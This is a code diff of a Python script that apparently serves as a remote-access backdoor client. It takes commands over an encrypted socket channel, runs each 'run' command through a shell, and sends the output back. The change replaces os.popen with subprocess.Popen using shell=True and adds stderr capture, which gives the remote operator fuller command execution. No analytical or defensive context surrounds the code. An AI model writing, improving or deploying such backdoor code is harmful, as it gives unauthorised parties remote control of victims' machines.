@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import os
 import socket
+import subprocess
 import sys
 
 from Crypto import Random
@@ -55,7 +55,10 @@ def main():
 
         # run command
         elif cmd == 'run':
-            results = os.popen(action).read()
+            results = subprocess.Popen(action, shell=True,
+                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                      stdin=subprocess.PIPE)
+            results = results.stdout.read() + results.stderr.read()
             s.sendall(encrypt(results))
 
         # send file
